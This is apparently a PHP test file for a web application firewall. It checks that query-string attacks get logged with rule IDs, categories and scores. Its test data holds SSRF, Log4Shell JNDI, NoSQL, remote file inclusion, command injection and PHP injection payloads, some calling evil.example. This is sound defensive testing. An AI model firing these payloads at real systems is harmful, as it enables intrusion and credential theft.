<?php

use Illuminate\Support\Facades\DB;

it('detects core attack classes carried in the query string', function (string $query, string $ruleId, string $category) {
    $this->get('/?'.$query)->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->rule_ids)->toContain($ruleId)
        ->and($log->category)->toBe($category);
})->with([
    'SSRF (cloud metadata)' => ['url=http://169.254.169.254/latest/meta-data', '934100', 'ssrf'],
    'Log4Shell (JNDI)' => ['x='.rawurlencode('${jndi:ldap://evil.example/a}'), '944150', 'log4shell'],
    'NoSQL operator' => ['filter[$ne]=1', '934200', 'nosqli'],
    'Remote File Inclusion' => ['file=http://evil.example/shell.txt', '931100', 'rfi'],
    'Command injection' => ['cmd='.rawurlencode(';id'), '932100', 'rce'],
    'PHP injection' => ['p='.rawurlencode('<?php echo 1; ?>'), '933100', 'php'],
]);

it('records the anomaly and confidence scores on a finding', function () {
    $this->get('/?url=http://169.254.169.254/')->assertOk();

    $log = DB::table('waf_logs')->first();

    expect((int) $log->anomaly_score)->toBeGreaterThan(0)
        ->and((int) $log->confidence_score)->toBeGreaterThan(0)
        ->and($log->confidence_label)->toBeIn(['low', 'medium', 'high', 'critical']);
});
